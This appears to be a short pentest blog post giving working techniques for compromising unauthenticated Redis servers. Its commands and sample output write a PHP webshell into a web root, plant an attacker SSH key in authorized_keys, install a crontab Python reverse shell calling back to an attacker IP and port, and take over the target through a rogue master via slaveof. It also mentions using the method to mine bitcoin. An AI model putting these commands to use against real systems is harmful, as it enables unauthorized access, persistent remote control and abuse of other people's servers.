---
layout:     post
title:      "Redis Hacking Tips"
date:       2017-02-09
categories: [Pentest, database, Redis]

---

### Get Webshell

​	You must know the physical path of the Web site 

```Bash
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```

​	If the webshell access exception, you can empty the database after backup and try again, remember to restore the database

### Get SSH--Crackit

1. Generate a ssh public-private key pair on your pc: **ssh-keygen -t rsa**

2. Write the public key to a file : **(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt**

3. Import the file into redis : **cat foo.txt \| redis-cli -h 10.85.0.52 -x set crackit**

4. Save the public key to the authorized_keys file on redis server : 

   ```Bash
   root@Urahara:~# redis-cli -h 10.85.0.52
   10.85.0.52:6379> config set dir /home/test/.ssh/
   OK
   10.85.0.52:6379> config set dbfilename "authorized_keys"
   OK
   10.85.0.52:6379> save
   OK
   ```

5. Finally, you can ssh to the redis server with private key : **ssh -i id_rsa test@10.85.0.52**


### Get Reverse Shell—Crontab

```Bash
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```

> The above command for Ubuntu, Centos need to be adjusted to：
>
> redis-cli -h 10.85.0.52 config set dir /var/spool/cron/

This method can also be used to earn bitcoin ：[yam](https://www.v2ex.com/t/286981#reply14)

### Master-Slave Moudle

​	The master redis all operations are automatically synchronized to the slave redis, which means that we can regard the vulnerability redis as a slave redis, connected to the master redis which our own controlled, then we can enter the command to our own redis.

```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```








